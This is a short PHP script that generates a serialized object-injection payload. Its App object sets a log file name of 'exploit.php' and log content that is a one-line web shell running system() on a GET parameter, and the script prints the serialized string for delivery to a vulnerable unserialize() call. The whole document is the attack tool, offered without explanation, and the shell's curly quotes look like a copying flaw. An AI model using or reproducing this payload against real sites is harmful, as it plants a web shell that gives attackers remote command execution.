<?php

class App
{
	public $logFile = 'exploit.php';
	public $logData = '<?php system($_GET[“makman”]);?>';
	
}

$obj = new App;

echo htmlspecialchars(serialize($obj));